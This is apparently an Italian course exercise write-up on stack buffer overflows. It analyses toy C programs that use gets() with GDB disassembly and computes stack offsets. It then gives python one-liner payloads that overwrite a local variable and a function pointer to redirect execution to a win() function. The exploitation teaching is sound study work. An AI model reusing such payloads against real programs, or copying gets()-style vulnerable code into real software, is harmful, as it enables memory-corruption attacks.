# Esercitazione Buffer Overflow

# Esercizio 1

## Codice C

```c
#include <stdio.h>

int main(int argc, char *argv[]){
    char buffer[1738];
    gets(buffer);
    return 0;
}
```

Compiliamo ed eseguiamo il programma sotto GDB per analizzarne il comportamento.

---

## Analisi con GDB

### Avvio di GDB

```bash
gdb ./esercizio1
```

### Disassemblaggio della funzione `main`

```gdb
(gdb) disassemble main
```

**Output di esempio**:

```
Dump of assembler code for function main:
   0x0804840b <main+0>:  lea    0x4(%esp),%ecx
   0x0804840f <main+4>:  and    $0xfffffff0,%esp
   0x08048412 <main+7>:  pushl  -0x4(%ecx)
   0x08048415 <main+10>: push   %ebp
   0x08048416 <main+11>: mov    %esp,%ebp
   0x08048418 <main+13>: push   %ecx
   0x08048419 <main+14>: sub    $0x6d4,%esp
   0x0804841f <main+20>: sub    $0xc,%esp
   0x08048422 <main+23>: lea    -0x6d2(%ebp),%eax
   0x08048428 <main+29>: push   %eax
   0x08048429 <main+30>: call   0x80482e0 <gets@plt>
   0x0804842e <main+35>: add    $0x10,%esp
   0x08048431 <main+38>: mov    $0x0,%eax
   0x08048436 <main+43>: mov    -0x4(%ebp),%ecx
   0x08048439 <main+46>: leave
   0x0804843a <main+47>: lea    -0x4(%ecx),%esp
   0x0804843d <main+50>: ret
End of assembler dump.
```

---

## Stack Frame e Registri

### Layout dello Stack Frame

Durante l’esecuzione, il compilatore crea uno **stack frame** che contiene:

- Le variabili locali (in questo caso il nostro `buffer`).
- Il **saved EBP** (il vecchio base pointer) e il **return address**.

Lo schema visivo dello stack è:

```
   ┌────────────────────────────┐   ← indirizzo maggiore (ad esempio, EBP)
   │   Saved EBP                │   ← salvato in automatico per collegare i frame
   ├────────────────────────────┤
   │   Return Address           │   ← indirizzo a cui tornare al termine della funzione
   ├────────────────────────────┤
   │   Variabili Locali         │   ← ad esempio, il nostro buffer (buffer[1738])
   │   ... (padding, etc.)      │
   └────────────────────────────┘   ← indirizzo inferiore (ESP)
```

Notiamo che il compilatore riserva **0x6d4 (1748) byte** sullo stack, anche se il `buffer` è di 1738 byte. I byte aggiuntivi servono per **allineamento** e **padding**.

In particolare:

```asm
lea -0x6d2(%ebp), %eax
```

calcola l’indirizzo di partenza del buffer come `EBP - 0x6d2` (1746 in decimale). Pertanto, pur dichiarando un array di 1738 byte, lo spazio effettivo allocato è di circa 1746 byte.

### Registri Principali

- **ESP (Stack Pointer):** punta al top dello stack, aggiornato con ogni `push`/`pop`.
- **EBP (Base Pointer):** punta alla base del frame della funzione; fisso per accedere a variabili locali.
- **EAX:** registro generico, spesso usato per il return value o calcoli aritmetici. Qui contiene l’indirizzo di `buffer` dopo `lea`.
- **ECX:** registro generico; nel prologo, usato per salvare valori temporanei.

### Calcolo dello Spazio Allocato

Se, ad esempio:
```
ebp = 0xffffd5c8
eax = 0xffffcef6  (risultato di lea -0x6d2(%ebp), %eax)
```

allora:
```
spazio_allocato = ebp - eax = 0xffffd5c8 - 0xffffcef6 = 0x6d2 (1746 in decimale)
```

## Costruzione di un Exploit

Conoscere la dimensione esatta del buffer e l’offset tra l’inizio del buffer e il return address (o altre variabili) è fondamentale per costruire un payload di overflow corretto.

## Conclusioni per Esercizio 1

- Il buffer ha circa 1746 byte disponibili, anche se dichiarato a 1738.
- L’ABI e l’allineamento introducono padding.
- Sapere l’offset effettivo consente di costruire exploit precisi.

---

# Esercizio 2

## Codice C di Riferimento

```c
#include <stdio.h>

int main(int argc, char* argv[]){
    int pluto;
    char buf[27];

    pluto = 0;
    gets(buf);

    if (pluto == 0x414243){
        printf("Ottimo! Hai modificato correttamente la variabile\n");
    }
    else{
        printf("Sbagliato! Pluto vale: 0x%08x\n", pluto);
    }
}
```

## Analisi Assembly

Un possibile disassemblaggio può mostrare:

```
0x0804846b <+0>:  lea 0x4(%esp),%ecx
0x0804846f <+4>:  and $0xfffffff0,%esp
0x08048472 <+7>:  pushl -0x4(%ecx)
0x08048475 <+10>: push %ebp
0x08048476 <+11>: mov %esp,%ebp
-> 0x08048478 <+13>: push %ecx
-> 0x08048479 <+14>: sub $0x24,%esp
-> 0x0804847c <+17>: movl $0x0,-0xc(%ebp)
-> 0x08048483 <+24>: sub $0xc,%esp
-> 0x08048486 <+27>: lea -0x27(%ebp),%eax
0x08048489 <+30>: push %eax
0x0804848a <+31>: call 0x8048330 <gets@plt>
0x0804848f <+36>: add $0x10,%esp
-> 0x08048492 <+39>: cmpl $0x414243,-0xc(%ebp)
0x08048499 <+46>: jne 0x80484ad <main+66>
0x0804849b <+48>: sub $0xc,%esp
0x0804849e <+51>: push $0x8048550
0x080484a3 <+56>: call 0x8048340 <puts@plt>
0x080484a8 <+61>: add $0x10,%esp
0x080484ab <+64>: jmp 0x80484c0 <main+85>
0x080484ad <+66>: sub $0x8,%esp
0x080484b0 <+69>: pushl -0xc(%ebp)
0x080484b3 <+72>: push $0x8048584
0x080484b8 <+77>: call 0x8048320 <printf@plt>
0x080484bd <+82>: add $0x10,%esp
0x080484c0 <+85>: mov $0x0,%eax
0x080484c5 <+90>: mov -0x4(%ebp),%ecx
0x080484c8 <+93>: leave
0x080484c9 <+94>: lea -0x4(%ecx),%esp
0x080484cc <+97>: ret
```

### Allocazione nello Stack

- `pluto` si trova a `-0xc(%ebp)`
- Il buffer `buf` inizia a `-0x27(%ebp)`

Calcoliamo la distanza:

```
0x27 - 0xc = 0x1b (27 in decimale)
```

Serve scrivere 27 byte prima di sovrascrivere `pluto`.

### Confronto con 0x414243

A riga <+39>, viene eseguito:

```
cmp 0x414243, -0xc(%ebp)
```

`0x414243` in ASCII è `ABC`.

Se forziamo:
```bash
python3 -c 'print("A"*27 + "ABC")' | ./esercizio2
```

Output:
```
Sbagliato! Pluto vale: 0x00434241
```

A causa della **little endian** (Intel x86), i byte `ABC` vengono memorizzati come `CBA`. Quindi, effettivamente `pluto` = `0x00434241`.

### Soluzione: Inserire `CBA`

Per settare `pluto = 0x414243`, dobbiamo inserire `CBA (0x434241)` nel payload:

```bash
python3 -c 'print("A"*27 + "CBA")' | ./esercizio2
```
O, analogamente:

```bash
python3 -c 'print("A"*27 + "\x43\x42\x41")' | ./esercizio2
```

Output:
```
Ottimo! Hai modificato correttamente la variabile
```

Questo dimostra che per impostare un valore esadecimale specifico in un ambiente little endian, bisogna invertire l’ordine dei byte.

# Esercizio 2.1 – Variante dell'Esercizio 2

```c
#include <stdio.h>
#include <stdint.h>

int main(int argc, char* argv[]){
  X topolino;
  X pluto;
  char buf[X];

  topolino = 0;
  pluto = 0;
  gets(buf);

  if (topolino == xXXXXX){
    printf("Ottimo! Hai modificato correttamente la variabile\n");
  }
  else{
    printf("Sbagliato! Topolino vale: 0x%08x\n", topolino);
  }
}
```

---

## Analisi del Codice Assembly

Osservando il binario con:

```
(gdb) disass main
Dump of assembler code for function main:
   0x0804846b <+0>:     lea    0x4(%esp),%ecx
   0x0804846f <+4>:     and    $0xfffffff0,%esp
   0x08048472 <+7>:     pushl  -0x4(%ecx)
   0x08048475 <+10>:    push   %ebp
   0x08048476 <+11>:    mov    %esp,%ebp
   0x08048478 <+13>:    push   %ecx
   0x08048479 <+14>:    sub    $0x34,%esp
   0x0804847c <+17>:    movl   $0x0,-0xc(%ebp)   ; allocazione topolino
   0x08048483 <+24>:    movw   $0x0,-0xe(%ebp)   ; allocazione pluto
   0x08048489 <+30>:    sub    $0xc,%esp
   0x0804848c <+33>:    lea    -0x30(%ebp),%eax  ; allocazione buffer
   0x0804848f <+36>:    push   %eax
   0x08048490 <+37>:    call   0x8048330 <gets@plt>
   0x08048495 <+42>:    add    $0x10,%esp
   0x08048498 <+45>:    cmpl   $0x41414141,-0xc(%ebp)  ; confronto per l'if
   0x0804849f <+52>:    jne    0x80484b3 <main+72>
   0x080484a1 <+54>:    sub    $0xc,%esp
   0x080484a4 <+57>:    push   $0x8048560
   0x080484a9 <+62>:    call   0x8048340 <puts@plt>
   0x080484ae <+67>:    add    $0x10,%esp
   0x080484b1 <+70>:    jmp    0x80484c6 <main+91>
   0x080484b3 <+72>:    sub    $0x8,%esp
   0x080484b6 <+75>:    pushl  -0xc(%ebp)
   0x080484b9 <+78>:    push   $0x8048594
   0x080484be <+83>:    call   0x8048320 <printf@plt>
   0x080484c3 <+88>:    add    $0x10,%esp
   0x080484c6 <+91>:    mov    $0x0,%eax
   0x080484cb <+96>:    mov    -0x4(%ebp),%ecx
   0x080484ce <+99>:    leave
   0x080484cf <+100>:   lea    -0x4(%ecx),%esp
   0x080484d2 <+103>:   ret
```

### Allocazioni nello Stack

1. `topolino` è memorizzato a `-0xc(%ebp)` (4 byte)
2. `pluto` a `-0xe(%ebp)` (2 byte)
3. Il buffer è a `-0x30(%ebp)`, passato poi a `gets()` in `%eax`
4. Il valore di confronto è `0x41414141` (`AAAA` in ASCII)

Per trovare l'**offset**, consideriamo che il buffer inizia a `-0x30(%ebp)` e vogliamo sovrascrivere `topolino` a `-0xc(%ebp)`.

### Breakpoint e Registri

Impostiamo un breakpoint a **main+37** (poco prima della chiamata `gets(buf)`) per leggere i registri:

```
(gdb) b *main+37
Breakpoint 1 at 0x8048490: file esercizio2_1.c, line 12.
(gdb) run
Starting program: /home/tux/Desktop/buffer_overflow/bin/esercizio2_1

Breakpoint 1, 0x08048490 in main (argc=1, argv=0xffffd674) at esercizio2_1.c:12
12              gets(buf);
(gdb) i r
eax            0xffffd598
ebp            0xffffd5c8
...
```

`%eax` = `0xffffd598`  
`%ebp` = `0xffffd5c8`

Quindi l'offset (in byte) dal buffer a `topolino` è:

```
offset = eax - (ebp - 0xc)
        = 0xffffd598 - 0xffffd5c8 + 0xc
        = -36
```

In decimale, corrisponde a **36** byte prima di poter sovrascrivere `topolino`.

## Creazione del Payload

Per impostare `topolino = 0x41414141`, costruiamo un payload di 36 byte + `AAAA`:

```bash
python3 -c 'print("c"*36 + "AAAA")' | ./esercizio2_1
```

Output:

```
Ottimo! Hai modificato correttamente la variabile
```

Così abbiamo sovrascritto `topolino` con il valore desiderato `0x41414141`. L’analisi segue lo stesso principio dell’esercizio 2, ma qui la variabile `topolino` e le dimensioni del buffer differiscono.

# Esercizio 3 – Overflow per esecuzione non autorizzata

## Codice C

```c
void win() {
    printf("Hai modificato correttamente il flusso di esecuzione\n");
}

int main(int argc, char *argv[]) {
    int (*fp)();
    char buffer[X];

    fp = 0;
    gets(buffer);
    if (fp) {
        printf("Chiamo l'indirizzo della funzione, salto a 0x%08x\n", fp);
        fp();
    }
}
```

L’obiettivo è sovrascrivere il puntatore a funzione `fp` con l’indirizzo della funzione `win()`, in modo da modificare il flusso di esecuzione.

---

## Analisi con GDB

### Disassemblaggio di `main`

Eseguendo:

```gdb
(gdb) disass main
```

**Output di esempio**:

```
Dump of assembler code for function main:
   0x08048484 <+0>:  lea    0x4(%esp),%ecx
   0x08048488 <+4>:  and    $0xfffffff0,%esp
   0x0804848b <+7>:  pushl  -0x4(%ecx)
   0x0804848e <+10>: push   %ebp
   0x0804848f <+11>: mov    %esp,%ebp
-> 0x08048491 <+13>: push   %ecx
-> 0x08048492 <+14>: sub    $0x14,%esp
-> 0x08048495 <+17>: movl   $0x0,-0xc(%ebp)   ; fp = 0
   0x0804849c <+24>: sub    $0xc,%esp
-> 0x0804849f <+27>: lea    -0x16(%ebp),%eax ; buffer
   0x080484a2 <+30>: push   %eax
   0x080484a3 <+31>: call   0x8048330 <gets@plt>
   0x080484a8 <+36>: add    $0x10,%esp
-> 0x080484ab <+39>: cmpl   $0x0,-0xc(%ebp)   ; if (fp != 0)
   0x080484af <+43>: je     0x80484c9 <main+69>
   0x080484b1 <+45>: sub    $0x8,%esp
   0x080484b4 <+48>: pushl  -0xc(%ebp)
   0x080484b7 <+51>: push   $0x8048598
   0x080484bc <+56>: call   0x8048320 <printf@plt>
   0x080484c1 <+61>: add    $0x10,%esp
   0x080484c4 <+64>: mov    -0xc(%ebp),%eax
   0x080484c7 <+67>: call   *%eax             ; esegue fp()
   0x080484c9 <+69>: mov    $0x0,%eax
   0x080484ce <+74>: mov    -0x4(%ebp),%ecx
   0x080484d1 <+77>: leave
   0x080484d2 <+78>: lea    -0x4(%ecx),%esp
   0x080484d5 <+81>: ret
```

- La variabile `fp` (il puntatore a funzione) si trova a `-0xc(%ebp)`.
- Il buffer inizia a `-0x16(%ebp)`.

## Determinare l'Offset

Per capire quanti byte separano il buffer da `fp`, impostiamo un breakpoint prima della `gets()` (ad esempio, a `main+31`) e osserviamo i registri in GDB.

Esempio:

```
(gdb) i r
eax = 0xffffd5d2
ebp = 0xffffd5e8
...

indirizzo_buffer = eax          = 0xffffd5d2
indirizzo_fp     = ebp - 0xc    = 0xffffd5dc

offset = indirizzo_buffer - indirizzo_fp
       = 0xffffd5d2 - 0xffffd5dc
       = -10

⇒ Necessari 10 byte di riempimento prima di sovrascrivere fp.
```

## Indirizzo di `win()`

Tramite `disass win` o `p win`, scopriamo l’indirizzo di `win()`. 

```
(gdb) disass win
Dump of assembler code for function win:
-> 0x0804846b <+0>:     push   %ebp   ; *win()
   0x0804846c <+1>:     mov    %esp,%ebp
   0x0804846e <+3>:     sub    $0x8,%esp
   0x08048471 <+6>:     sub    $0xc,%esp
   0x08048474 <+9>:     push   $0x8048560
   0x08048479 <+14>:    call   0x8048340 <puts@plt>
   0x0804847e <+19>:    add    $0x10,%esp
   0x08048481 <+22>:    nop
   0x08048482 <+23>:    leave  
   0x08048483 <+24>:    ret    
End of assembler dump.
```

L'indirizzo è il seguente: `0x0804846b`.

In ambiente **little endian**, l’indirizzo `0x0804846b` va inserito come byte sequence `\x6b\x84\x04\x08`.

## Creazione del Payload

Costruiamo una stringa che:
1. Contiene 10 byte di padding (ad esempio `"A"*10`).
2. Subito dopo, i 4 byte dell’indirizzo di `win()` in ordine little endian.

Esempio:

```bash
python -c 'import sys; sys.stdout.buffer.write(b"A"*10 + b"\x6b\x84\x04\x08")' | ./esercizio3
```

### Output

```
Chiamo l'indirizzo della funzione, salto a 0x0804846b
Hai modificato correttamente il flusso di esecuzione
```

> **Nota**: Usare `sys.stdout.buffer.write` evita di aggiungere il `\n` finale e di incorrere in problematiche di codifica. Inoltre, è opportuno disabilitare ASLR e compilare con `-fno-stack-protector -no-pie` per avere indirizzi e offset stabili.